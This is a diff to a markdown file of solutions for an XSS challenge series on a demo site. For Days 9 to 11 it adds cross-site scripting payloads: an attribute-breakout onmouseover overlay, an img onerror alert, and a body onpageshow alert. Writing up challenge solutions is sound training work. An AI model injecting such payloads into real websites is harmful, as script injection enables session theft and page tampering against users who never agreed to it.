@@ -59,12 +59,17 @@ alternativ solution *(mouse cursor has to be in the 'conent area' of the browser
 " onmouseover="alert(1)" style="display: block; position: fixed; top: 0; left: 0; z-index: 99999; width: 9999px; height: 9999px; (mouse cursor musst be on content area of browser window)
 ```
 **+++ Day 9 +++**  
-https://xmass.compass-demo.com/level9
+https://xmass.compass-demo.com/level9 *(yes, worked on Day 6 already)*
 ```
 <img src="#" onerror="alert(1)"/>
 ```
 **+++ Day 10 +++**  
 https://xmass.compass-demo.com/level10
+```
+<body onpageshow=alert(1)>
+```
+**+++ Day 11 +++**  
+https://xmass.compass-demo.com/level11
 ```
 tbc
 ```
